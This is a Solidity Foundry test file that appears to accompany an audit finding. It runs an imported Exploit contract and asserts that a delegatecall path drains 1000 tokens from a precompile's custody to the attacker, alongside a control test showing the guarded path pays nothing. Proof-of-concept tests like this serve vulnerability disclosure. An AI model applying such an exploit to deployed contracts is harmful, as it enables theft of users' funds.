// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import {Exploit, Precompile, Asset, Whitelisted} from "./45168-h-01-unauthorized-contracts-can-bypass-precompile-authorizat.sol";

contract Finding45168Test is Test {
    function test_delegatecall_pulls_precompile_custody() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.pulled(), 1000, "unauthorized pull");
        assertEq(e.guarded(), 0, "execution-address guard pays 0");
        assertTrue(e.directRejected(), "own code address is not listed");
        assertEq(e.asset().balanceOf(address(e)), 1000, "attacker holds the custody");
        assertEq(e.asset().balanceOf(address(e.pre())), 0, "precompile emptied");
        console2.log("pulled", e.pulled());
        console2.log("guarded", e.guarded());
    }

    function test_control_execution_address_pays_zero() public {
        Asset asset = new Asset();
        Precompile pre = new Precompile(asset);
        Whitelisted listed = new Whitelisted(pre);
        asset.mint(address(pre), 1000);
        pre.allow(address(listed));

        uint256 quoted = pre.guardedPull(address(this), 1000);
        assertEq(quoted, 0, "unlisted execution address");
        assertEq(asset.balanceOf(address(pre)), 1000, "custody untouched");
        console2.log("control quote", quoted);
        console2.log("control custody", asset.balanceOf(address(pre)));
    }
}
